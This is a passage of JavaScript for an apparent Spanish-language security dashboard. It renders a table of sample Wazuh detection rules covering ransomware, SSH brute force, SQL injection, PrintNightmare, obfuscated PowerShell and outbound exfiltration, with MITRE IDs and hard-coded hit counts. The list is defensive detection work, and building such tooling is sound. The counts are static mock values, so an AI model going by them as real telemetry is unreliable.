    { id: '100100', level: 15, group: 'ransomware', desc: 'Ransomware: escritura masiva de archivos cifrados', enabled: true,  hits24h: 3,   mitre: 'T1486'    },
    { id: '100200', level: 14, group: 'ml,anomaly', desc: 'Anomalía de comportamiento (ML Ollama) — proceso sospechoso',  enabled: true,  hits24h: 12,  mitre: 'T1055'    },
    { id: '87702',  level: 13, group: 'ransomware', desc: 'Pattern match: extensiones .locked/.encrypted en escritura masiva', enabled: true,  hits24h: 2,   mitre: 'T1486'    },
    { id: '60128',  level: 13, group: 'windows',    desc: 'Privilege escalation vía print spooler (PrintNightmare)',   enabled: true,  hits24h: 1,   mitre: 'T1068'    },
    { id: '5710',   level: 10, group: 'sshd',       desc: 'SSH brute-force: múltiples intentos de login fallidos',     enabled: true,  hits24h: 847, mitre: 'T1110.001'},
    { id: '5763',   level: 10, group: 'sshd',       desc: 'SSH brute-force: umbral de 10 intentos en 60s superado',   enabled: true,  hits24h: 241, mitre: 'T1110.001'},
    { id: '31101',  level: 9,  group: 'web',        desc: 'Múltiples respuestas HTTP 400/401 — posible escaneo web',   enabled: true,  hits24h: 128, mitre: 'T1595'    },
    { id: '31103',  level: 9,  group: 'web',        desc: 'Inyección SQL detectada en parámetros HTTP',                enabled: true,  hits24h: 44,  mitre: 'T1190'    },
    { id: '554',    level: 8,  group: 'ossec',      desc: 'Archivo nuevo creado en directorio del sistema',            enabled: true,  hits24h: 67,  mitre: 'T1105'    },
    { id: '5501',   level: 8,  group: 'syslog',     desc: 'Inicio de sesión de usuario root desde terminal remoto',   enabled: false, hits24h: 0,   mitre: 'T1078.003'},
    { id: '4103',   level: 7,  group: 'windows',    desc: 'PowerShell ScriptBlock logging: ejecución ofuscada',       enabled: true,  hits24h: 23,  mitre: 'T1059.001'},
    { id: '92651',  level: 7,  group: 'network',    desc: 'Tráfico saliente en puerto no estándar > 10MB/s',          enabled: true,  hits24h: 8,   mitre: 'T1041'    },
    { id: '80792',  level: 6,  group: 'fim',        desc: 'FIM: modificación de binario crítico del sistema',         enabled: true,  hits24h: 1,   mitre: 'T1565.001'},
    { id: '2932',   level: 5,  group: 'pam',        desc: 'Sesión de usuario iniciada fuera del horario laboral',    enabled: false, hits24h: 0,   mitre: 'T1078'    },
  ];

  const levelColor = l => l >= 13 ? 'var(--danger)' : l >= 10 ? 'var(--amber)' : l >= 7 ? 'var(--signal)' : 'var(--text-dim)';
  const active    = rules.filter(r => r.enabled).length;
  const critRules = rules.filter(r => r.level >= 13).length;
  const hitsTotal = rules.reduce((s, r) => s + r.hits24h, 0);

  return `
  <div class="grid grid--4" style="margin-bottom:16px">
    ${Kpi('REGLAS ACTIVAS',    String(active),    'signal')}
    ${Kpi('REGLAS CRÍTICAS',   String(critRules), 'danger')}
    ${Kpi('DISPAROS / 24H',    hitsTotal.toLocaleString('es'), 'amber')}
    ${Kpi('DESACTIVADAS',      String(rules.length - active), '')}
  </div>

  <!-- Filters row -->
  <section class="panel" style="margin-bottom:12px">
    <div class="panel__body" style="padding:10px 16px;display:flex;gap:10px;align-items:center;flex-wrap:wrap">
      <span style="font-size:9.5px;letter-spacing:2px;color:var(--text-faint)">FILTRAR:</span>
      ${['Todas','ransomware','sshd','windows','web','fim','network','ml'].map((g,i) => `
        <button ${actEl('__filterRules', g)} style="background:${i===0?'rgba(60,255,158,0.12)':'none'};border:1px solid ${i===0?'var(--signal)':'var(--line)'};color:${i===0?'var(--signal)':'var(--text-dim)'};font-family:var(--ff-mono);font-size:9px;letter-spacing:1.5px;padding:4px 12px;cursor:pointer">${g.toUpperCase()}</button>
      `).join('')}
      <input id="rulesSearch" oninput="window.__searchRules(this.value)" placeholder="buscar regla…" style="margin-left:auto;background:var(--bg-input,rgba(0,0,0,0.3));border:1px solid var(--line);color:var(--text);font-family:var(--ff-mono);font-size:10px;padding:4px 10px;outline:none;width:200px">
    </div>
  </section>

  <!-- Rules table -->
  <section class="panel" style="flex:1">
    <div class="panel__head">
      <div class="panel__title">Reglas de detección Wazuh</div>
      <div class="panel__meta">Motor: Ossec/Wazuh Rules Engine · Última sync: hace 2m</div>
    </div>
    <div class="panel__body" style="padding:0;overflow-x:auto">
      <table class="table" id="rulesTable">
        <thead>
          <tr>
            <th>ID</th><th>Nivel</th><th>Grupo</th><th>Descripción</th>
            <th>MITRE</th><th>Disparos 24h</th><th>Estado</th><th>Acción</th>
          </tr>
        </thead>
        <tbody>
          ${rules.map((r, idx) => `
          <tr data-group="${r.group}" data-desc="${r.desc.toLowerCase()}" style="border-bottom:1px solid var(--line-faint)">
            <td style="font-variant-numeric:tabular-nums;color:var(--text-bright);white-space:nowrap">${r.id}</td>
            <td style="white-space:nowrap"><span style="color:${levelColor(r.level)};font-size:10px;font-weight:700">${r.level}</span></td>
            <td style="white-space:nowrap"><span style="font-size:9px;letter-spacing:1px;color:var(--text-dim);background:rgba(0,0,0,0.25);padding:2px 6px">${r.group}</span></td>
            <td style="max-width:320px;word-break:break-word">${r.desc}</td>
            <td style="white-space:nowrap"><span style="font-size:9px;letter-spacing:1px;color:var(--cyan)">${r.mitre}</span></td>
            <td style="font-variant-numeric:tabular-nums;text-align:right;padding-right:20px;color:${r.hits24h>50?'var(--danger)':r.hits24h>10?'var(--amber)':'var(--text-dim)'}">${r.hits24h > 0 ? r.hits24h.toLocaleString('es') : '—'}</td>
            <td style="white-space:nowrap"><span style="color:${r.enabled?'var(--signal)':'var(--danger)'};font-size:9.5px;letter-spacing:1.5px">${r.enabled ? '● ACTIVA' : '○ INACTIVA'}</span></td>
            <td style="white-space:nowrap">
              <div style="display:flex;gap:6px">
                <button ${act('__openRule', idx)} style="background:none;border:1px solid var(--line);color:var(--text-dim);font-family:var(--mono);font-size:9px;padding:3px 8px;cursor:pointer">VER</button>
                <button ${act('__toggleRule', r.id, idx)} style="background:none;border:1px solid ${r.enabled ? 'rgba(255,58,58,.5)' : 'rgba(60,255,158,.5)'};color:${r.enabled ? 'var(--danger)' : 'var(--signal)'};font-family:var(--mono);font-size:9px;padding:3px 8px;cursor:pointer">${r.enabled ? 'OFF' : 'ON'}</button>
              </div>
            </td>
          </tr>`).join('')}
        </tbody>
      </table>
    </div>
  </section>
  `;
}

window.__filterRules = function(group, btn) {
  document.querySelectorAll('#rulesTable tbody tr').forEach(tr => {
    const show = group === 'Todas' || tr.dataset.group.includes(group);
    tr.style.display = show ? '' : 'none';
  });
  btn.closest('.panel__body').querySelectorAll('button').forEach(b => {
    b.style.background = 'none';
    b.style.borderColor = 'var(--line)';
    b.style.color = 'var(--text-dim)';
  });
  btn.style.background   = 'rgba(60,255,158,0.12)';
  btn.style.borderColor  = 'var(--signal)';
  btn.style.color        = 'var(--signal)';
};

window.__searchRules = function(val) {
  const q = val.toLowerCase();
  document.querySelectorAll('#rulesTable tbody tr').forEach(tr => {
    tr.style.display = tr.dataset.desc.includes(q) || tr.cells[0]?.textContent.includes(q) ? '' : 'none';
  });
};

window.__toggleRule = function(ruleId, idx) {
  const rows = document.querySelectorAll('#rulesTable tbody tr');
  const row  = rows[idx];
  if (!row) return;
  const btn      = row.querySelector('button:last-child');
  const statusEl = row.querySelector('td:nth-child(7) span');
  const isActive = statusEl.textContent.includes('ACTIVA');
  statusEl.textContent = isActive ? '○ INACTIVA' : '● ACTIVA';
  statusEl.style.color = isActive ? 'var(--danger)' : 'var(--signal)';
  btn.textContent      = isActive ? 'ON' : 'OFF';
  btn.style.borderColor = isActive ? 'rgba(60,255,158,.5)' : 'rgba(255,58,58,.5)';
  btn.style.color       = isActive ? 'var(--signal)' : 'var(--danger)';
};

window.__openRule = function(idx) {
  const rule = window.__rulesData?.[idx];
  if (rule && typeof window.__openRuleModal === 'function') window.__openRuleModal(rule);
};

window.VIEWS = {
  users:        renderUsers,
  overview:     renderOverview,
  siem:         renderSIEM,
  map:          renderMap,
  incidents:    renderIncidents,
  assets:       renderAssets,
  vulns:        renderVulns,
  threat:       renderThreat,
  network:      renderNetwork,
  playbooks:    renderPlaybooks,
  metrics:      renderMetrics,
  'agent-detail': renderAgentDetail,
  reports:      renderReports,
  ollama:       renderOllama,
  rules:        renderRules,
  cowrie:       renderCowrie,
  tickets:      renderTickets,
};
window.mountAlerts = mountAlerts;
window.renderRail = renderRail;
window.mountLeafletMap = mountLeafletMap;
